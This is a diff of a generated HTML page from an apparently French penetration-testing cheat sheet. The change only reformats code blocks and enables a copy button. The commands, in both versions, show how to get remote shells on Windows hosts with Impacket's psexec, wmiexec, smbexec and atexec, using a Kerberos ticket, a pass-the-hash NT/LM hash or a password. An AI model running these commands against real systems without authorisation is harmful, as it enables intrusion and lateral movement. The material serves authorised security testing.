@@ -7715,49 +7715,49 @@
   <h1>Shell depuis linux</h1>
 
 <h4 id="psexec">PsExec</h4>
-<p>Avec un TGS:</p>
-<pre><code class="language-bash">export KRB5CCNAME=truc.ccache
-impacket-psexec -k -no-pass $domain/$user@$target
-</code></pre>
-<p>Avec un hash:</p>
-<pre><code class="language-bash">impacket-psexec $domain/$user@$target -hashes nt:lm
-</code></pre>
-<p>Avec password:</p>
-<pre><code class="language-bash">impacket-psexec $domain/$user@$target
-</code></pre>
+<p>Avec un TGS:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>truc.ccache
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>impacket-psexec<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$target</span>
+</span></code></pre></div></p>
+<p>Avec un hash:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>impacket-psexec<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$target</span><span class="w"> </span>-hashes<span class="w"> </span>nt:lm
+</span></code></pre></div></p>
+<p>Avec password:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>impacket-psexec<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$target</span>
+</span></code></pre></div></p>
 <h4 id="wmiexec">WmiExec</h4>
-<p>Avec un TGS:</p>
-<pre><code class="language-bash">export KRB5CCNAME=truc.ccache
-impacket-wmiexec -k -no-pass $domain/$user@$target
-</code></pre>
-<p>Avec un hash:</p>
-<pre><code class="language-bash">impacket-wmiexec $domain/$user@$target -hashes nt:lm
-</code></pre>
-<p>Avec password:</p>
-<pre><code class="language-bash">impacket-wmiexec $domain/$user@$target
-</code></pre>
+<p>Avec un TGS:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>truc.ccache
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>impacket-wmiexec<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$target</span>
+</span></code></pre></div></p>
+<p>Avec un hash:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>impacket-wmiexec<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$target</span><span class="w"> </span>-hashes<span class="w"> </span>nt:lm
+</span></code></pre></div></p>
+<p>Avec password:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>impacket-wmiexec<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$target</span>
+</span></code></pre></div></p>
 <h4 id="smbexec">SmbExec</h4>
-<p>Avec un TGS:</p>
-<pre><code class="language-bash">export KRB5CCNAME=truc.ccache
-impacket-smbexec -k -no-pass $domain/$user@$target
-</code></pre>
-<p>Avec un hash:</p>
-<pre><code class="language-bash">impacket-smbexec $domain/$user@$target -hashes nt:lm
-</code></pre>
-<p>Avec password:</p>
-<pre><code class="language-bash">impacket-smbexec $domain/$user@$target
-</code></pre>
+<p>Avec un TGS:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>truc.ccache
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>impacket-smbexec<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$target</span>
+</span></code></pre></div></p>
+<p>Avec un hash:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>impacket-smbexec<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$target</span><span class="w"> </span>-hashes<span class="w"> </span>nt:lm
+</span></code></pre></div></p>
+<p>Avec password:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>impacket-smbexec<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$target</span>
+</span></code></pre></div></p>
 <h4 id="atexec">AtExec</h4>
-<p>Avec un TGS:</p>
-<pre><code class="language-bash">export KRB5CCNAME=truc.ccache
-impacket-atexec -k -no-pass $domain/$user@$target $command
-</code></pre>
-<p>Avec un hash:</p>
-<pre><code class="language-bash">impacket-atexec $domain/$user@$target -hashes nt:lm $command
-</code></pre>
-<p>Avec password:</p>
-<pre><code class="language-bash">impacket-atexec $domain/$user@$target $command
-</code></pre>
+<p>Avec un TGS:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>truc.ccache
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>impacket-atexec<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$target</span><span class="w"> </span><span class="nv">$command</span>
+</span></code></pre></div></p>
+<p>Avec un hash:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>impacket-atexec<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$target</span><span class="w"> </span>-hashes<span class="w"> </span>nt:lm<span class="w"> </span><span class="nv">$command</span>
+</span></code></pre></div></p>
+<p>Avec password:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>impacket-atexec<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>@<span class="nv">$target</span><span class="w"> </span><span class="nv">$command</span>
+</span></code></pre></div></p>
 
 
 
@@ -7804,7 +7804,7 @@ impacket-atexec -k -no-pass $domain/$user@$target $command
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
